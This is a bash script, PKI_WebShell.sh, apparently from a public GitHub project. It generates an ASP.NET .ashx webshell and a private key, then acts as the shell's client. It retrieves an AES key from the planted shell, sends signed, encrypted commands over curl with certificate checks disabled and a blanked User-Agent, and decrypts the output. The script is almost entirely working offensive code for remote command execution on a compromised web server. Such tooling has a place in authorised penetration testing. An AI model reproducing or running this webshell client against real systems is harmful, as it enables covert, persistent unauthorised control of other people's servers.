#!/bin/bash

# -----------------------------------------------
# PKI_WebShell.sh
# -----------------------------------------------
# Copyright (c) 2018 Paul Taylor @bao7uo
# See README on github for detailed information.
# github.com/bao7uo/PKI_WebShell
# -----------------------------------------------
# -----------------------------------------------

function cert_gen() {
    openssl req -x509 -sha512 -nodes -days 365 \
        -subj "/C=ws/ST=ws/L=ws/O=ws/OU=ws/CN=ws" -newkey rsa:4096 \
        -outform der -keyout $1.priv.key | base64 -w 0
}

function webshell_gen() {
    webshell="$(cat PKI_WebShell.cs)"
    webshell="${webshell#??}";
    public_cert=$(echo -n $1 | sed -e 's/\//\\\//g')
    echo -n "$webshell" |
        sed -e "s/PublicCert = \"\";/PublicCert = \"$public_cert\";/g"
}

function print_help() {
        echo "PKI_WebShell by Paul Taylor @bao7uo"
        echo "  https://github.com/bao7uo/PKI_WebShell"
        echo "Generate webshell and private key:"
        echo "  ./PKI_Webshell_Client.sh -g test"
        echo "Run command:"
        echo "  ./PKI_Webshell_Client.sh -u https://test.local/test.ashx -k test.priv.key -c 'dir /as c:\'"
}

OPTIND=1

while getopts "g:hu:k:c:" options; do
    case "$options" in
    h|\?)
        print_help
        exit 0
        ;;
    g)  public_cert=$(cert_gen $OPTARG)
        webshell_gen $public_cert > $OPTARG.ashx
        exit 0
        ;;
    u)  url="$OPTARG"
        ;;
    k)  private_key="$OPTARG"
        ;;
    c)  cmd="$OPTARG"
    esac
done

if (( $OPTIND == 1 )); then
   print_help
   exit 0
fi

function url_encode() {
    echo -n $1 | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
}

function sign() {
  echo -n $1 | openssl dgst -sign $2 | base64 -w 0
}

function decrypt() {
    echo -n $1 | base64 -d | \
        openssl rsautl -decrypt -inkey $2 -keyform PEM -oaep
}

function sha256() {
    echo -n $1 | sha256sum | head -c 64
}

function get_key() {
  action=$(sha256 key_retrieval)
  decrypt $(curl -H 'User-Agent:' -sk $1 -d \
    "a=$action&s=$(url_encode $(sign $action $2))") $2
}

function get_iv() {
    echo -n $(date +%s%c%N)$(cat /dev/urandom | head -c 512 | \
      tr -dc '[:alnum:]') | md5sum | head -c 32
}

function encrypt() {
    echo -n $1 | openssl enc -aes-256-cbc -base64 -A -K $2 -iv $3
}

key=$(get_key $url $private_key)
iv=$(get_iv)

action=$(sha256 command_execution)
command=$(encrypt "$cmd" $key $iv)
signature=$(sign $command $private_key)

for section in $(\
    curl -H 'User-Agent:' -sk $url -d \
        "a=$action&c=$(url_encode $command)&s=$(url_encode $signature)&i=$iv"
    ); do
  decrypt $section $private_key
done
